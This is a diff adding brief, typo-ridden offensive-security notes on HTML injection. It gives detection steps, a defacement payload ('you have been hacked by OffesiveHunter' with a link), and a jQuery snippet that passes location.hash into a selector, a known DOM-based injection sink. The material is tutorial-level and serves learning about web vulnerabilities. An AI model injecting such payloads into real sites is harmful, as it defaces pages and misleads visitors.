@@ -1,0 +1,34 @@
+html injectoin is a type of injection issue that occurs when a user is able to control an input point and is able to inject arbitrary html code into a vulnerable web page.
+
+
+#========================================================================================================================
+
+steps 
+1. find a input parameter either get based or post based
+2. if your input reflect back to you on web page there may e htmli
+3.execute any html code, if you succeed to execute any html code there , then there is html injection
+
+#========================================================================================================================
+Exploitation of HTML Injection
+Modify the web page 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+<h1>you have been hacked by OffesiveHunter</h1>
+<A HREF="http://bing.com/">OffensiveHunter</A>
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+DOM LOad 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+<script src="../js/jquery-1.7.1.js"></script>
+<script>
+function setMessage(){
+ var t=location.hash.slice(1);
+ $("div[id="+t+"]").text("The DOM is now loaded and can be manipulated.");
+}
+$(document).ready(setMessage  );
+$(window).bind("hashchange",setMessage)
+</script>
+<body><script src="../js/embed.js"></script>
+<span><a href="#message" > Show Here</a><div id="message">Showing Message1</div></span>
+<span><a href="#message1" > Show Here</a><div id="message1">Showing Message2</div>
+<span><a href="#message2" > Show Here</a><div id="message2">Showing Message3</div>
+</body>
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
